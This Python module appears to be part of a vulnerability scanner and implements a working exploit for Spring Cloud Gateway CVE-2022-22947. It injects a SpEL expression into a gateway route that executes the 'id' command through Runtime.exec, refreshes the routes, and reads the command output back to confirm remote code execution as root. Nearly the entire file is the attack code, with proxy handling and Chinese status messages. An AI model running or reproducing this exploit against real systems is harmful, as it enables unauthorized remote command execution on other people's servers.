import requests
import time
from bs4 import BeautifulSoup
import re
import os
import logging

cdd=''
http = ''
https = ''
def dl16(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie=None):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        body = {
                "id": "hacktest",
                "filters": [{
                "name": "AddResponseHeader",
                "args": {
                "name": "Result",
                "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
                }
                }],
                "uri": "http://example.com"
                }
        logging.captureWarnings(True)
        aa = requests.post(url1+'actuator/gateway/routes/hacktest',cookies=s_cookie,json=body,proxies=proxies, verify=False,timeout=5)
        aa.encoding = 'utf-8'
        if aa.status_code==201:
            body = {

            }
            logging.captureWarnings(True)
            aa1 = requests.post(url1 + 'actuator/gateway/refresh',cookies=s_cookie,data=body,verify=False,proxies=proxies,timeout=5)
            aa1.encoding = 'utf-8'
            if aa1.status_code==200:
                headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36'}
                logging.captureWarnings(True)
                aa2= requests.get(url1 + 'actuator/gateway/routes/hacktest',cookies=s_cookie,headers=headers,verify=False,proxies=proxies,timeout=5)
                aa2.encoding = 'utf-8'
                cd= BeautifulSoup(aa2.text, 'html.parser')
                if 'uid=0' in cd.text and 'groups=0' in cd.text:
                    cdd=cd.text
                else:
                    cdd='[-]漏洞不存在'
            else:
                cdd= '[-]应用路由'
        else:
            cdd= '[-]添加恶意SpEL表达式路由'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def sp1():
    global cdd
    return '--------------------------------------------------\n[ Spring CVE-2022-22947 ]\n\n'+ str (cdd)+'\n'
def s1(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)